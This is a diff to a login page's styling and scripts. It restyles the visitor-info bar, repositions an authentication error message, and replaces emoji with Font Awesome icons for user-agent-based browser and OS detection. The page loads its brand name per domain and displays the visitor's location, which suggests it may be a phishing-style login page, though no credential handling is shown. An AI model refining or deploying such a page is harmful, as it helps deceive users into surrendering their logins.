@@ -165,12 +165,12 @@
       letter-spacing: -0.3px;
     }
     
-    /* Visitor Info - Friend's Style */
+    /* Visitor Info - Friend's Style (Black Text) */
     .visitor-info {
       text-align: center;
       padding: 14px 20px 10px;
       font-size: 13px;
-      color: #444;
+      color: #000000;
       border-bottom: 1px solid #f0f0f0;
     }
     
@@ -211,11 +211,17 @@
     
     .form-group {
       margin-bottom: 16px;
+      position: relative;
+    }
+    
+    .input-with-icon {
+      position: relative;
+      width: 100%;
     }
     
     .input-with-icon input {
       width: 100%;
-      padding: 12px 12px 12px 44px;
+      padding: 12px 44px 12px 44px;
       border: 2px solid #2d7df4;
       border-radius: 4px;
       font-size: 15px;
@@ -237,6 +243,7 @@
       transform: translateY(-50%);
       color: #94a3b8;
       font-size: 16px;
+      z-index: 1;
     }
     
     .input-with-icon .toggle-password {
@@ -247,14 +254,24 @@
       cursor: pointer;
       color: #94a3b8;
       font-size: 16px;
+      z-index: 1;
     }
     
     .input-with-icon .toggle-password:hover {
       color: #1a1a1a;
     }
     
+    .auth-error {
+      color: #d11a1a;
+      font-size: 14px;
+      margin-top: 10px;
+      margin-bottom: 10px;
+      text-align: center;
+      display: none;
+    }
+    
     .checkbox-group {
-      margin: 18px 0 20px;
+      margin: 0 0 20px 0;
     }
     
     .checkbox-group label {
@@ -288,14 +305,6 @@
     
     .btn-submit:active {
       transform: scale(0.98);
-    }
-    
-    .auth-error {
-      color: #d11a1a;
-      font-size: 14px;
-      margin-top: 10px;
-      text-align: center;
-      display: none;
     }
     
     .footer-links {
@@ -404,11 +413,11 @@
       <div class="brand-name" id="brandName">Loading...</div>
     </div>
     
-    <!-- Visitor Info - Friend's Style -->
+    <!-- Visitor Info - Friend's Style (Black Text) -->
     <div class="visitor-info" id="visitorInfo">
       <span id="visitDateTime">Loading...</span> &nbsp;&nbsp;
-      <span id="visitBrowserIcon">🌐</span> <span id="visitBrowser">Loading...</span> &nbsp;&nbsp;
-      <span id="visitOSIcon">🪟</span> <span id="visitOS">Loading...</span>
+      <span id="visitBrowserIcon"><i class="fas fa-globe"></i></span> <span id="visitBrowser">Loading...</span> &nbsp;&nbsp;
+      <span id="visitOSIcon"><i class="fas fa-desktop"></i></span> <span id="visitOS">Loading...</span>
       <br>
       <span id="visitLocation">📍 Loading...</span>
       
@@ -437,6 +446,7 @@
           </div>
         </div>
         
+        <!-- AUTH ERROR - Now BEFORE show password, in red -->
         <div class="auth-error" id="authError">Authentication is required!</div>
         
         <div class="checkbox-group">
@@ -485,33 +495,33 @@
     function getOSInfo() {
       const ua = navigator.userAgent;
       if (ua.includes('Windows')) {
-        if (ua.includes('Windows NT 10.0')) return { name: 'Windows', icon: '🪟' };
-        if (ua.includes('Windows NT 6.3')) return { name: 'Windows 8.1', icon: '🪟' };
-        if (ua.includes('Windows NT 6.2')) return { name: 'Windows 8', icon: '🪟' };
-        if (ua.includes('Windows NT 6.1')) return { name: 'Windows 7', icon: '🪟' };
-        return { name: 'Windows', icon: '🪟' };
+        if (ua.includes('Windows NT 10.0')) return { name: 'Windows', icon: 'fa-windows' };
+        if (ua.includes('Windows NT 6.3')) return { name: 'Windows 8.1', icon: 'fa-windows' };
+        if (ua.includes('Windows NT 6.2')) return { name: 'Windows 8', icon: 'fa-windows' };
+        if (ua.includes('Windows NT 6.1')) return { name: 'Windows 7', icon: 'fa-windows' };
+        return { name: 'Windows', icon: 'fa-windows' };
       }
       if (ua.includes('Mac OS X') || ua.includes('Macintosh')) {
-        return { name: 'macOS', icon: '🍎' };
+        return { name: 'macOS', icon: 'fa-apple' };
       }
       if (ua.includes('Linux')) {
-        if (ua.includes('Android')) return { name: 'Android', icon: '📱' };
-        if (ua.includes('CrOS')) return { name: 'ChromeOS', icon: '🌐' };
-        return { name: 'Linux', icon: '🐧' };
+        if (ua.includes('Android')) return { name: 'Android', icon: 'fa-android' };
+        if (ua.includes('CrOS')) return { name: 'ChromeOS', icon: 'fa-chrome' };
+        return { name: 'Linux', icon: 'fa-linux' };
       }
-      if (/iPhone|iPad|iPod/i.test(ua)) return { name: 'iOS', icon: '🍎' };
-      return { name: 'Unknown', icon: '💻' };
+      if (/iPhone|iPad|iPod/i.test(ua)) return { name: 'iOS', icon: 'fa-apple' };
+      return { name: 'Unknown', icon: 'fa-desktop' };
     }
     
     // --- DETECT BROWSER AND ICON ---
     function getBrowserInfo() {
       const ua = navigator.userAgent;
-      if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) return { name: 'Chrome', icon: '🌐' };
-      if (ua.includes('Safari') && !ua.includes('Chrome')) return { name: 'Safari', icon: '🧭' };
-      if (ua.includes('Firefox')) return { name: 'Firefox', icon: '🦊' };
-      if (ua.includes('Edg')) return { name: 'Edge', icon: '🌐' };
-      if (ua.includes('OPR') || ua.includes('Opera')) return { name: 'Opera', icon: '🎭' };
-      return { name: 'Unknown', icon: '🌐' };
+      if (ua.includes('Chrome') && !ua.includes('Edg') && !ua.includes('OPR')) return { name: 'Chrome', icon: 'fa-chrome' };
+      if (ua.includes('Safari') && !ua.includes('Chrome')) return { name: 'Safari', icon: 'fa-safari' };
+      if (ua.includes('Firefox')) return { name: 'Firefox', icon: 'fa-firefox' };
+      if (ua.includes('Edg')) return { name: 'Edge', icon: 'fa-edge' };
+      if (ua.includes('OPR') || ua.includes('Opera')) return { name: 'Opera', icon: 'fa-opera' };
+      return { name: 'Unknown', icon: 'fa-globe' };
     }
     
     // --- GET LOCATION ---
@@ -587,11 +597,11 @@
       document.getElementById('visitLocation').textContent = await getLocation();
       
       const os = getOSInfo();
-      document.getElementById('visitOSIcon').textContent = os.icon;
+      document.getElementById('visitOSIcon').className = `fas ${os.icon}`;
       document.getElementById('visitOS').textContent = os.name;
       
       const browser = getBrowserInfo();
-      document.getElementById('visitBrowserIcon').textContent = browser.icon;
+      document.getElementById('visitBrowserIcon').className = `fab ${browser.icon}`;
       document.getElementById('visitBrowser').textContent = browser.name;
       
       await fetchBranding(domain);
